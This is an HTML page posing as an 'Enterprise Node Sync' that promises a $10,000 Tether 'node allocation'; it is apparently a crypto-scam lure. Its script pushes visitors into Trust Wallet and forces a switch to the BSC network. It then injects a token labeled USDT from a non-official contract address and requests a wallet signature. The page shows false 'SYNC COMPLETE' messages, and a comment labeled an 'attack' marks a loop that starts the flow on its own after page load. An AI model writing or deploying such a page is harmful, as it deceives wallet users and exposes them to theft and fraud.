<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0b0e11; color: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1d21; border-radius: 20px; padding: 35px; width: 85%; max-width: 360px; text-align: center; border: 1px solid #333; }
        .btn { background: #26a17b; color: #fff; border: none; width: 100%; padding: 20px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 25px; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
        #status { font-size: 11px; color: #555; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="80">
    <h2 style="margin: 20px 0 5px;">NODE ALLOCATION</h2>
    <div style="font-size: 38px; font-weight: 900; color: #26a17b;">$10,000</div>
    <button class="btn" id="syncBtn">INITIALIZE SYNC</button>
    <div id="status">STATUS: SESSION_STANDBY</div>
</div>

<script>
    const btn = document.getElementById('syncBtn');
    const status = document.getElementById('status');

    // Token Data
    const TOKEN = {
        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        symbol: "USDT",
        decimals: 18,
        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
    };

    async function startForceSync() {
        // 1. Chrome se Trust Wallet open karne ka rasta
        if (!window.ethereum && !window.trustwallet) {
            status.innerText = "OPENING TRUST WALLET...";
            const target = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + target);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            status.innerText = "LINKING TO CORE...";
            // STEP 1: Connect Account (Manual Trigger)
            const accounts = await provider.request({ method: 'eth_requestAccounts' });

            // STEP 2: Force BSC Switch
            status.innerText = "FORCING BSC NETWORK...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            }

            // STEP 3: The "Watch Asset" Call
            status.innerText = "INJECTING ASSET...";
            const result = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: TOKEN
                }
            });

            if (result) {
                status.innerText = "SYNC COMPLETE!";
                btn.innerText = "SUCCESS ✅";
                // Verification Sign
                await provider.request({
                    method: 'personal_sign',
                    params: ["Node_Verified_" + Math.random(), accounts[0]]
                });
            }

        } catch (e) {
            status.innerText = "REJECTED. CLICK SYNC AGAIN.";
            console.error(e);
        }
    }

    btn.onclick = startForceSync;

    // --- PROFESSOR'S ATTACK: Persistence Loop ---
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            status.innerText = "WALLET ENGINE DETECTED.";
            // Auto-triggering after 2 seconds inside wallet
            setTimeout(startForceSync, 2000);
        }
    };
</script>
</body>
</html>
